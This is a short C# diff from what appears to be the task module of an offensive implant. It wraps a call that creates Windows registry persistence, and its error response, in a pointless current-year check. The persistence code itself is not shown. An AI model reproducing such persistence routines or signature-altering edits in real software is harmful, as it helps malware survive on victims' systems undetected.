@@ -18,15 +18,15 @@ namespace Tasks
         {
             try
             {
-                return PersistenceHandler.CreateRegistryPersistence();
+                if(DateTime.Now.Year > 2020) { return PersistenceHandler.CreateRegistryPersistence(); } else { return null; }
             }
             catch (Exception ex)
             {
-                return new PhantomTaskResponse
+                if(DateTime.Now.Year > 2020) { return new PhantomTaskResponse
                 {
                     Completed = false,
                     UserOutput = $"Error creating registry persistence: {ex.Message}"
-                };
+                }; } else { return null; }
             }
         }
     }
